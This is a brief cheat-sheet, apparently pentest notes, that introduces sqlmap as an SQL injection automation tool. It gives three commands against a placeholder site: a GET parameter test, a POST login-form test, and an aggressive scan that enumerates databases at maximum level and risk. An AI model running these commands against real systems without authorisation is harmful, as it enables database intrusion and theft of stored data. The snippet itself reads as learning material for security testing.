This is a tool which automates SQL injection tasks

```bash
sqlmap -u "http://target.com/page.php?id=1" 
```

POST request :
```bash
sqlmap -u "http://target.com/login.php" --data="username=admin&password=1234"
```

```bash
sqlmap -u "http://target.com/page.php?id=1" --random-agent --batch --level=5 --risk=3 --dbs
```

